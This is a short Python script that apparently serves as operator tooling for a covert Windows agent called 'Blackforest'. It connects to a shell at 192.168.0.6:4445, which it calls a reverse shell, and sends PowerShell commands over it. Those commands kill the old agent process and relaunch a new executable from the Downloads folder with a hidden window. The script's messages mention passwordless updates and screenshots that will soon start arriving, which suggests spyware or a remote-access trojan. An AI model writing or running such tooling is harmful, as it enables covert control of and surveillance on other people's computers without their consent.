#!/usr/bin/env python3
"""
Automatic Agent Restart Script
Connects to reverse shell and restarts agent to apply bug-fixed update
"""
import socket
import time

def send_command(sock, cmd):
    """Send command and wait for response"""
    sock.sendall((cmd + "\n").encode())
    time.sleep(2)
    data = sock.recv(8192).decode('utf-8', errors='ignore')
    print(data)
    return data

def main():
    print("[*] Connecting to reverse shell (192.168.0.6:4445)...")
    
    # Connect to shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.6', 4445))
    
    print("[+] Connected! Restarting agent...")
    
    # Read initial prompt
    time.sleep(1)
    initial = s.recv(8192).decode('utf-8', errors='ignore')
    print(initial)
    
    # Stop old process
    print("\n[*] Stopping old agent...")
    send_command(s, "Stop-Process -Name Blackforest -Force -ErrorAction SilentlyContinue")
    
    time.sleep(2)
    
    # Start new agent from Downloads
    print("\n[*] Starting bug-fixed agent...")
    send_command(s, 'Start-Process "$env:USERPROFILE\\Downloads\\Blackforest.exe" -WindowStyle Hidden')
    
    time.sleep(2)
    
    # Verify it started
    print("\n[*] Verifying new agent...")
    result = send_command(s, "Get-Process Blackforest -ErrorAction SilentlyContinue | Select-Object -First 1")
    
    if "Blackforest" in result:
        print("\n[+] SUCCESS! Bug-fixed agent is running!")
        print("[+] From now on, all updates are PASSWORDLESS!")
        print("[+] Screenshots should start appearing in 30 seconds...")
    else:
        print("\n[-] Agent might not have started. Check manually.")
    
    s.close()
    print("\n[*] Done!")

if __name__ == "__main__":
    main()
